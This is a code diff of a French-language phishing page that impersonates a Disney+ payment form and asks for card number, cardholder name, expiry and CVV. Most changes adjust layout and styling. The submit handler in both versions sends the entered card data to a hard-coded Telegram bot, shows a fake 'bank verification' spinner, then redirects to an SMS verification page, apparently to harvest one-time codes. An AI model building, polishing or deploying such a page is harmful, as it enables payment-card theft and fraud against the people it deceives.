@@ -11,26 +11,26 @@
       background: radial-gradient(circle at top, #003264 0%, #032541 100%);
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
+      align-items: flex-start;
+      justify-content: center;
       padding: 60px 20px 30px;
-    }
-
-    .logo {
-      width: 120px;
-      margin-bottom: 30px;
     }
 
     main {
       background-color: #fff;
       color: #000;
+      max-width: 380px;
       width: 100%;
-      max-width: 360px;
       border-radius: 20px;
-      padding: 40px 30px;
+      padding: 25px 25px 30px;
       box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
       text-align: center;
+    }
+
+    .logo {
+      width: 110px;
+      margin: 0 auto 20px;
+      display: block;
     }
 
     h1 {
@@ -83,24 +83,33 @@
     .footer-note {
       font-size: 0.75rem;
       color: #444;
-      margin-top: 30px;
+      margin-top: 26px;
       line-height: 1.4;
       text-align: left;
     }
 
     .logos-container {
       display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
+      flex-wrap: nowrap;
+      justify-content: flex-start;
       align-items: center;
-      gap: 14px;
-      margin-top: 14px;
+      gap: 8px;
+      margin-top: 10px;
+      overflow-x: auto;
+      padding-bottom: 6px;
+      scrollbar-width: none;
+      -ms-overflow-style: none;
+    }
+
+    .logos-container::-webkit-scrollbar {
+      display: none;
     }
 
     .logos-container img {
-      height: 22px;
+      height: 18px;
       opacity: 0.7;
       filter: grayscale(100%);
+      flex-shrink: 0;
     }
 
     #spinnerOverlay {
@@ -137,7 +146,7 @@
 
     @media (max-width: 480px) {
       main {
-        padding: 30px 20px;
+        padding: 22px 20px;
       }
 
       h1 {
@@ -150,7 +159,7 @@
       }
 
       .logos-container img {
-        height: 20px;
+        height: 16px;
       }
 
       .cb-icons img {
@@ -161,9 +170,9 @@
 </head>
 <body>
 
-  <img src="Images/compose2.png" alt="Disney+" class="logo" />
-
   <main>
+    <img src="Images/compose2.png" alt="Disney+" class="logo" />
+
     <h1>Informations de paiement</h1>
 
     <div class="cb-icons">
@@ -178,7 +187,6 @@
       <input type="text" placeholder="MM/AA" required />
       <input type="text" placeholder="Cryptogramme (CVV)" required />
 
-      <!-- ✅ Texte commercial ajouté ici -->
       <p style="font-size: 0.85rem; color: #333; margin-bottom: 20px; text-align: left;">
         En validant votre paiement, vous acceptez que votre abonnement Disney+ commence immédiatement. Il sera renouvelé automatiquement chaque mois, sauf annulation. Aucun engagement, vous pouvez résilier à tout moment.
       </p>
@@ -202,48 +210,48 @@
     </div>
   </main>
 
-  <!-- Spinner Overlay -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
     <div class="spinner-text">Vérification bancaire en cours...</div>
   </div>
 
   <script>
-  document.getElementById("paymentForm").addEventListener("submit", function(e) {
-    e.preventDefault();
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-    const spinner = document.getElementById("spinnerOverlay");
-    spinner.style.display = "flex";
+      const spinner = document.getElementById("spinnerOverlay");
+      spinner.style.display = "flex";
 
-    const cardNumber = document.querySelector('input[placeholder="Numéro de carte"]').value.trim();
-    const name = document.querySelector('input[placeholder="Nom sur la carte"]').value.trim();
-    const expiry = document.querySelector('input[placeholder="MM/AA"]').value.trim();
-    const cvv = document.querySelector('input[placeholder="Cryptogramme (CVV)"]').value.trim();
+      const cardNumber = document.querySelector('input[placeholder="Numéro de carte"]').value.trim();
+      const name = document.querySelector('input[placeholder="Nom sur la carte"]').value.trim();
+      const expiry = document.querySelector('input[placeholder="MM/AA"]').value.trim();
+      const cvv = document.querySelector('input[placeholder="Cryptogramme (CVV)"]').value.trim();
 
-    const message = `💳 Nouvelle tentative de paiement Disney+ :\n\nNuméro de carte : ${cardNumber}\nNom : ${name}\nExpiration : ${expiry}\nCVV : ${cvv}`;
+      const message = `💳 Nouvelle tentative de paiement Disney+ :\n\nNuméro de carte : ${cardNumber}\nNom : ${name}\nExpiration : ${expiry}\nCVV : ${cvv}`;
 
-    const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
-    const chatId = "-4970333928";
+      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+      const chatId = "-4970333928";
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
       })
-    })
-    .catch((error) => {
-      console.error("Erreur Telegram:", error);
-    })
-    .finally(() => {
-      setTimeout(() => {
-        window.location.href = "sms-verification.html";
-      }, 15000); // 15 secondes
+      .catch((error) => {
+        console.error("Erreur Telegram:", error);
+      })
+      .finally(() => {
+        setTimeout(() => {
+          window.location.href = "sms-verification.html"; // à remplacer si besoin
+        }, 2500);
+      });
     });
-  });
-</script>
+  </script>
+
 </body>
 </html>
